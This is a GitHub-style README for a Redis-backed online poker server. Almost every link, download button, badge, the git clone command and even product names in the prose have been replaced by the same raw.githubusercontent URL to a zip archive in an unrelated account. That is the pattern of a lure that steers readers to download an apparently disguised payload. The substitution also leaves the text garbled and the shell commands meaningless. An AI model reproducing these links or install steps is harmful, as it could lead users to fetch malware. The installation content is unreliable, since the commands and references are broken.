# casino-server #

[![npm version](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)

[![Build Status](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)

[![NPM](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)

An online poker game server powered by redis, https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip and https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip

![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip) ![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
  
Game rules supported:
- [x] Chat Room (聊天室)
- [x] Jinhua (诈金花/三张牌)
- [x] Texas Holdem (德州扑克)
- [ ] Fight Landlord (斗地主)
- [ ] Blackjack (21点)

Features: 
- [x] Cross-platform: powered by https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip, easy to deploy on various platforms.
- [x] Scalable: using Redis as message bus and data storage.
- [x] Open architecture: with Redis as the message bus, easy to interact and extend.
- [x] Cluster: using PM2, sticky session, and https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
- [x] WebSocket protocol: come with javascript client API and web-based demo. 
- [x] Event logger for server events and user actions.

TODO List:
- [ ] Client API for Unity3D (C#, support https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
- [ ] Payment gateway callback URL.
- [ ] Admin Portal.
- [ ] Load balancing: using NginX, or auto handled if deployed to Amazon Cloud.

# Architecture #

![Architecture](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)

## Required ##

* Redis

Redis is an open source, BSD licensed, advanced key-value cache and store. It is often referred to as a data structure server since keys can contain strings, hashes, lists, sets, sorted sets, bitmaps and hyperloglogs.

[Download](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)

* https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip / npm

https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.

[Download](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)

* PM2 (production & cluster)

PM2 is a production process manager for https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.

[Read More](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)

# Installation #

* Installing globally and run as service with PM2: 

```bash
[sudo] npm install pm2 -g
[sudo] npm install casino-server -g

# run redis-server first
redis-server &

# run as service and cluster mode
pm2 start `which casino-server` -i 0
```

* Installing as a node app, and run in current folder:

```bash
git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip casino
cd casino
npm install
# sudo npm install -g gulp
# gulp build
node bin/casino-server [options]
```

Now you can visit http://localhost:7000, it's a web-based game client for testing and demo purpose.

```bash
# open a browser to access the test web page
open http://localhost:7000/
```

# Available Options: #

-p Port to use (defaults to 7000)

-h Host address to use (defaults to 0.0.0.0)

-r Address of Redis server (defaults to 127.0.0.1:6379)

# Tools #

With Redis as the message bus, it's very easy for tools to work with the open architecture.

## Event Logger ##

Start the event logger to monitor the events:

```bash
https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
```

Or, log the events into log file:

```bash
https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip -o https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
```
# See Also

* [https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip for Unity3D](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip), is a https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip client library for Unity3D. You can develop casino games with Unity3D, and using this library to connect to this casino server.

# Credits #

This poker game server is created by Raymond Xie, published under MIT license.

It can be used for FREE, but be aware that:

* It is provided as it is. (Not a mature commercial product, may be incomplete, or even lots of bugs)
* We will mainly focus on our own needs. 
* You can propose wish for new features, but don't rely on us to implement them. Instead of waiting for new features, welcome join us to implement them.
* You need take your own risk, including that you need find answers from reading code instead of easily asking only. :P

If you are interested in this project, you can contribute in any of following aspects:

* Simply "Star" it.
* Use it or test it, report bugs or even send pull request of patches.
* Add better HTML5 demo client.
* Add new poker game rules.
* Add client APIs in other languages (like C# for Unity, Java, Objective-C, C/C++, etc.)
* Help us write documentation, if your English is good.

